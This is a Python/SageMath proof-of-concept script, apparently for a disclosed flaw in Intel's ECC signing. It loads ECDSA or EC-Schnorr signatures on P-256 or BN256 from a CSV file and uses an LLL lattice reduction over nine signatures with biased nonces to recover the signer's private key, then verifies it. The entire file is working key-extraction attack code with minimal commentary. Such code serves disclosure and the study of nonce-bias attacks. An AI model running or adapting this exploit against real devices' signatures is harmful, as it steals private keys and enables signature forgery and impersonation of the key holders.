from sage.all import *
from fpylll import *
import random

DIM = 9
SIZE = 256

curves = {}

def p256():
    p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
    K = GF(p)
    a = K(0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc)
    b = K(0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b)
    E = EllipticCurve(K, (a, b))
    G = E(0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296, 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)
    E.set_order(0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 * 0x1)
    return E, G

def bn256():
    p = 0xfffffffffffcf0cd46e5f25eee71a49f0cdc65fb12980a82d3292ddbaed33013
    K = GF(p)
    a = K(0)
    b = K(3)
    E = EllipticCurve(K, (a, b))
    G = E(1, 2)
    E.set_order(0xfffffffffffcf0cd46e5f25eee71a49e0cdc65fb1299921af62d536cd10b500d * 0x1)
    return E, G

def load_relations(data_file, alg, curve):
    E, _ = curve
    q = E.order()

    relations = []
    with open(data_file, "r") as f:
        next(f) # skip header
        prev_public_key = None
        for line in f:
            r, s, m, public_key = line.split(",")
            if prev_public_key and public_key != prev_public_key:
                print("Differing public key")
                return (None, None)
            prev_public_key = public_key
            if alg == "ECDSA":
                a = (int(m, 16) * pow(int(s, 16), -1, q)) % q
                b = (int(r, 16) * pow(int(s, 16), -1, q)) % q
            elif alg == "ECSCHNORR":
                a = int(s, 16)
                b = int(r, 16)
                b = q - b # we need to negate e, because ECSCHNORR uses a_i = nonce_i + b_i * x mod p
            else:
                print("Unknown algorithm")
                return (None, None)

            relations.append((a, b)) # a = nonce_i - b_i * x mod p

    relations = random.sample(relations, DIM) # take only as little as needed
    public_key = E(int(public_key[2:66], 16), int(public_key[66:], 16))

    return relations, public_key

def solve(relations, public_key, curve):
    '''
    p
    ...
        p
    (a_0-1)*d   , (a_1-1)*d , ..., (a_n-1)*d
    b_0*d       , b_1*d     , ..., b_n*d
    '''
    E, G = curve
    q = E.order()

    B = 2**(SIZE - 32)
    d = pow(2 ** 32, -1, q)
    M = IntegerMatrix(DIM + 2, DIM + 1)
    for i in range(DIM):
        M[i, i] = q
        a, b = relations[i]
        M[-2, i] = int((a - 1) * d % q)
        M[-1, i] = int((b * d) % q)
    M[-2, -1] = q >> 32
    LLL.reduction(M)

    nonces = [abs(M[i, 0] << 32) + 1 for i in range(DIM)]

    for nonce in nonces:
        nonce = nonce % q
        for a, b in relations:
            recovered_x = int((nonce - a)* pow(b, -1, q) % q)
            if recovered_x * G == public_key:
                return recovered_x

if __name__ == "__main__":
    import argparse

    argparser = argparse.ArgumentParser(description="PoC for the Intel ECC signature flaw")
    argparser.add_argument("data_file", help="The file containing the signatures")
    argparser.add_argument("--alg", default="ECDSA", choices=["ECDSA", "ECSCHNORR"], help="The algorithm used for signing")
    argparser.add_argument("--curve", default="P256", choices=["P256", "BN256"], help="The curve used for signing")
    args = argparser.parse_args()

    curve = {"P256": p256, "BN256": bn256}[args.curve]()

    relations, public_key = load_relations(args.data_file, args.alg, curve)
    if relations is None:
        exit(1)

    private_key = solve(relations, public_key, curve)
    if private_key is None:
        print("No solution found")
        exit(1)

    print(f"{hex(private_key)} * G == ({hex(public_key[0])}, {hex(public_key[1])})")
    print(private_key * curve[1] == public_key)

